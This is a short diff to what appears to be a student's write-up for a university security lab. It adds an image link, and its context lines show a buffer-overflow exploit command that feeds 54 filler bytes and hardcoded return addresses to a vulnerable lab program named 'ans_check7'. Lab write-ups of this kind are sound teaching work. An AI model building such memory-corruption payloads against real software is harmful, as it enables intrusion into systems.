@@ -107,6 +107,7 @@ $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\x
 ```
 [02/23/22]seed@VM:Byeongchan$ ./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xcf\xf0\xff\xbf'")
 ```
+![lab5_1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/lab5_1.png)
 
 
 ## ans_check7.c
